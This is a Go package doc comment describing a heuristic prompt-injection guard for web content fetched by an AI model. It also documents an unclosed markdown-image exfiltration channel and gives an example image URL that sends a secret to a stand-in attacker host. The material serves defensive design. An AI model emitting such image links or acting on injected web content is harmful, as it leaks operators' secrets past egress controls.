// Package websafe is the pure-Go injection-guard core for the grounded web-fetch path.
// It reduces and flags prompt-injection risk in fetched, untrusted web content before
// that content is handed to the model; it does NOT eliminate it.
//
// The guard layer is four cooperating transforms applied in the production fetch order
// sanitize -> normalize -> classify -> fence:
//
// - sanitize: strip all markup via bluemonday StrictPolicy + entity-decode.
// - normalize: NFKC fold + remove invisible/zero-width and bidi control runes.
// - classify: heuristic multi-word rule-family matcher returning a Verdict.
// - fence: wrap the cleaned text in a crypto/rand-nonced provenance fence.
//
// HONESTY POSTURE (binding): this layer REDUCES and FLAGS prompt injection; it
// does NOT eliminate it. The classifier is a flag-not-block tripwire — a Detected verdict
// annotates the response metadata, but the sanitized and fenced content is returned
// regardless. A heuristic rule set has finite recall: a novel phrasing can pass undetected.
// Operator-facing and package copy therefore say "reduces and flags, does not eliminate"
// and must never claim the layer confers immunity or that it stops the attack outright
// (a directory-walking grep-ban test in honesty_test.go enforces this, forbidding the
// dishonest phrasings it lists).
//
// KNOWN RESIDUAL — the markdown-image zero-click exfiltration channel (NOT closed):
// even with fetched content sanitized, normalized, classified, and fenced, the model can
// later emit a markdown image such as ![](https://attacker.example/p?data=<secret>) in its
// own reply. The operator's BROWSER renders that markdown and fetches the URL, leaking the
// embedded data to the attacker. Because the fetch happens in the operator's browser, it
// bypasses the inference container's egress controls entirely — this guard layer cannot see
// or stop it. This markdown-image channel is a documented, accepted residual for v1.5, NOT
// claimed closed; the Phase-33 egress bound is the real backstop, and surfacing the guard
// verdict (Phase 34) is the operator-visible signal.
package websafe
